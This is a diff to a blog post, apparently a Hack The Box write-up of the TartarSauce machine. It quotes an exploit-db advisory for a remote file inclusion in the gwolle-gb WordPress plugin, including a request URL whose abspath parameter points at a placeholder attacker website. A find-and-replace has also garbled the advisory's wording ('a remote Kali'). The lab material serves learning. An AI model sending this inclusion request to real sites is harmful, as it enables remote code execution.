@@ -16,7 +16,7 @@ published: true
 ![tartarsauce-banner.png]({{ "/img/htb/boxes/tartarsauce/tartarsauce-banner.png" | relative_url }})
 
 <h4 style="color:red;margin-bottom:0;">TartarSauce: 10.10.10.88</h4>
-<h4 style="color:red;">Attacker: 10.10.14.14</h4>
+<h4 style="color:red;">Kali: 10.10.14.14</h4>
 
 * TOC
 {:toc}
@@ -208,7 +208,7 @@ root@kali:~# seachsploit -x exploits/php/webapps/38861.txt
      Path: /usr/share/exploitdb/exploits/php/webapps/38861.txt
 
 ...
-HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the attacker needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:
+HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote Kali can include a file named 'wp-load.php' from arbitrary remote server and execute its content on the vulnerable web server. In order to do so the Kali needs to place a malicious 'wp-load.php' file into his server document root and includes server's URL into request:
 
 http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
 ...
